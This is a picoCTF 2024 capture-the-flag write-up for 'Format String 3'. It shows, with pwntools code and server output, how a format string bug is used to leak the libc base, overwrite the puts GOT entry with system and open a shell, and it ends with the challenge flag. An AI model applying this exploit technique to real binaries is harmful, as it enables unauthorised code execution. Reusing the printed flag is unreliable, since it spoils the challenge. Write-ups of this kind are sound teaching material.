# Format String 3 - picoCTF 2024

## Description
This program doesn't contain a win function. How can you win?
Download the binary [here](https://play.picoctf.org/practice/challenge/449?originalEvent=73&page=2).
Download the source [here](https://play.picoctf.org/practice/challenge/449?originalEvent=73&page=2).
Download libc [here](https://play.picoctf.org/practice/challenge/449?originalEvent=73&page=2), download the interpreter [here](https://play.picoctf.org/practice/challenge/449?originalEvent=73&page=2). Run the binary with these two files present in the same directory.
nc rhea.picoctf.net 57040

## My Approach
Let's analyze the `format-string-3.c` file to get a grasp of the program. The program's output look particularly like this:
```
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x74749008a3f0
```
From the `format-string-3.c` file, the value `0x74749008a3f0` is the address of the `setvbuf`. This address will change everytime we reconnect to the challenge. One noticeable variable is the string `normal_string` has the value "/bin/sh", which can help us easily trigger `system("/bin/sh");` in C program. All we have to do is somehow changing the `puts` function into `system` function. We can do this by overwrite the GOT entry for the `puts` function into `system` function. We will perform this by exploiting format string vulnerability. To read more about this vulnerability, please check this [book](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)

### Finding the GOT address of the `puts` function
There are many ways to find it. The fastest way is to use command `objdump -d format-string-3` piped with command `grep puts` to disassemble all the functions used in `format-string-3` and find the `puts` function:
```
$ objdump -d format-string-3 | grep puts
0000000000401080 <puts@plt>:
  401084:       f2 ff 25 8d 2f 00 00    bnd jmp *0x2f8d(%rip)        # 404018 <puts@GLIBC_2.2.5>
  40121d:       e8 5e fe ff ff          call   401080 <puts@plt>
  4012f2:       e8 89 fd ff ff          call   401080 <puts@plt>
```
The GOT entry for `puts` is right before the `<puts@GLIBC_2.2.5>`, which is `0x404018`. You can also use tools like `gdb` or `ghidra` to disassemble the `puts` function but I found this way more convenient. You can also use `python3` to find it:
```
# elf = ELF("format-string-3")
# puts_got = elf.got['puts']
# print(hex(puts_got))
```

### Finding the base address of libc
Some functions like `setvbuf` and `system` are located in libc. However, the location of libc in memory is determined by runtime, which explains why we have different address of `setvbuf` each time we reconnect. This process (called ASLR) is used to defend certain type of attacks and the base address of libc changes due to this. To find it, we can subtract the address value of `setvbuf` we get from the server with the actual address of `setvbuf` in libc file. Finding this base address isn't hard but first we have to find the address of `setvbuf` in libc file:
```
$ objdump -d libc.so.6 | grep setvbuf
000000000007a3f0 <_IO_setvbuf@@GLIBC_2.2.5>:
```
Now we can calculate the base address of libc. Remember, this base address changes everytime we reconnect to the server. Using `pwn` library can help the tasks flow smoother:
```
#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'

def conn():
    # if args.LOCAL:
    #     r = process([exe.path])
    #     if args.DEBUG:
    #         gdb.attach(r)
    # else:
    r = remote("rhea.picoctf.net", 57040)

    return r
p = conn()
p.recvline()
setvbuf_mem = int(p.recvline()[-13:-1],16) # Extracting the address of setvbuf in server's memory and convert it into integer
setvbuf_libc = 0x07a3f0
libc_base = setvbuf_mem-setvbuf_libc
```

### Calculating the address of `system` in memory
To calculate the actual address of `system` from the server, we can add the address of `system` from libc file to the base address of libc. First, the address of `system` in libc file can be found using the same way (in this case, it's 0x4f760):
```
$ objdump -d libc.so.6 | grep system
000000000004f760 <__libc_system@@GLIBC_PRIVATE>:
   4f767:       74 07                   je     4f770 <__libc_system@@GLIBC_PRIVATE+0x10>
```
Now, we calculate:
```
system_libc = 0x4f760
system_mem = libc+system_libc
```

### Overwriting the GOT entry for `puts` into `system`
We're gonna use `fmtstr_payload` to overwrite the value of the GOT entry for `puts`. To do this, we first need to find the offset value. By spamming `%p`, we can see the offset:
```
p=conn()
p.sendline(b'%p.'*50)
p.recvline()
p.recvline()
print(p.recvline())
```
And, the output is like this:
```
python3 solution.py
[+] Opening connection to rhea.picoctf.net on port 52872: Done
b'0x796376407963.0xfbad208b.0x7ffdc650ab60.0x1.(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.\n'
[*] Closed connection to rhea.picoctf.net port 52872
```
Until the string `%p.` are repeated (which is 0x70252e in hex), there are 38 chunks of `%p.` shows different value. We can adjusting the number repeated downto 38:
```
p=conn()
p.sendline(b'%p.'*38)
p.recvline()
p.recvline()
print(p.recvline())
```
And, the output is like this:
```
python3 solution.py
[+] Opening connection to rhea.picoctf.net on port 52872: Done
b'0x78b5b22a6963.0xfbad208b.0x7ffe74629b80.0x1.(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).0x70252e70252e7025.\n'
[*] Closed connection to rhea.picoctf.net port 52872
```
The offset is 38. Put everything together, we can send our payload like this:
```
payload = fmtstr_payload(38, {puts_got: system_mem})
p.sendline(payload)
p.sendline(b"ls")
for i in range(10):
    print(p.recvline())
```
The output looks like this:
```
 python3 solution.py
[*] '/home/zedttxj/test/format-string-3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'.'
0x404018
[+] Opening connection to rhea.picoctf.net on port 52872: Done
b'                                                                                               c               \x8b                                                         \xf0            \x01                       \x00
                                                         \x00aaaaba\x18@@Makefile\n'
b'artifacts.tar.gz\n'
b'flag.txt\n'
b'format-string-3\n'
b'format-string-3.c\n'
b'ld-linux-x86-64.so.2\n'
b'libc.so.6\n'
b'metadata.json\n'
b'profile\n'
```
We successfully execute another `/bin/sh` shell. We also listed all the files in the current directive using `ls` and found out `flag.txt`. By adding `p.interactive()` at the end of the code, you can interact with the shell.
```
p.sendline(payload)
p.interactive()
```
picoCTF{G07_G07?_cf6cb591}
